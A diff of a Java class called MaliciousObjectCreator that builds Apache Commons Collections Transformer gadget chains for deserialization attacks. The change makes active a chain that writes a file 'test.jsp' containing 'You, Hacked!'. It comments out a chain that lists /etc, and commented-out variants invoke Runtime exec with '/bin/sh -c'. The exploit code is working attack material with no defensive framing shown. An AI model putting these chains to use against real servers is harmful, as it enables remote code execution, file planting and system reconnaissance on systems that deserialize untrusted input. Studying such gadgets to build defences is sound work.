@@ -20,20 +20,20 @@ class MaliciousObjectCreator {
 //                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
 //                new InvokerTransformer("exec", new Class[]{String[].class}, new Object[]{new String[]{"/bin/sh", "-c", "code"}})
 //        };
-//        Transformer[] transformers = new Transformer[]{
-//                new ConstantTransformer(FileOutputStream.class), // Constant for FileOutputStream
-//                new InvokerTransformer("getConstructor", new Class[]{Class[].class}, new Object[]{new Class[]{String.class}}), // Get the constructor of FileOutputStream
-//                new InvokerTransformer("newInstance", new Class[]{Object[].class}, new Object[]{new Object[]{"test.txt"}}), // Instantiate FileOutputStream with the file path
-//                new InvokerTransformer("write", new Class[]{byte[].class}, new Object[]{"You, Hacked!".getBytes()}), // Write content to the file
-//                new InvokerTransformer("close", new Class[0], new Object[0]) // Close the FileOutputStream
-//        };
-
         Transformer[] transformers = new Transformer[]{
-                new ConstantTransformer(File.class), // Constant for File class
-                new InvokerTransformer("getConstructor", new Class[]{Class[].class}, new Object[]{new Class[]{String.class}}), // Get the constructor of File
-                new InvokerTransformer("newInstance", new Class[]{Object[].class}, new Object[]{new Object[]{"/etc"}}), // Instantiate File with the directory path
-                new InvokerTransformer("list", null, null), // List filenames in the directory as an array of Strings
+                new ConstantTransformer(FileOutputStream.class), // Constant for FileOutputStream
+                new InvokerTransformer("getConstructor", new Class[]{Class[].class}, new Object[]{new Class[]{String.class}}), // Get the constructor of FileOutputStream
+                new InvokerTransformer("newInstance", new Class[]{Object[].class}, new Object[]{new Object[]{"test.jsp"}}), // Instantiate FileOutputStream with the file path
+                new InvokerTransformer("write", new Class[]{byte[].class}, new Object[]{"You, Hacked!".getBytes()}), // Write content to the file
+                new InvokerTransformer("close", new Class[0], new Object[0]) // Close the FileOutputStream
         };
+
+//        Transformer[] transformers = new Transformer[]{
+//                new ConstantTransformer(File.class), // Constant for File class
+//                new InvokerTransformer("getConstructor", new Class[]{Class[].class}, new Object[]{new Class[]{String.class}}), // Get the constructor of File
+//                new InvokerTransformer("newInstance", new Class[]{Object[].class}, new Object[]{new Object[]{"/etc"}}), // Instantiate File with the directory path
+//                new InvokerTransformer("list", null, null), // List filenames in the directory as an array of Strings
+//        };
 
 //        Transformer[] transformers = new Transformer[]{
 //                new ConstantTransformer(FileOutputStream.class), // Constant for FileOutputStream
